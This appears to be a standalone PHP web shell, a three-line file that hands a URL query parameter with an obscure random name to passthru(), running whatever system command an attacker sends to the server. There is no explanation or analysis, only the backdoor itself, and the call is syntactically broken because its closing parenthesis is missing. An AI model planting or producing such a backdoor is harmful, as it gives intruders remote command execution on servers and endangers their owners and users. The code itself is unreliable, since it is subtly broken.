<?php
passthru($_GET['Vcp0jsc5'];
?>
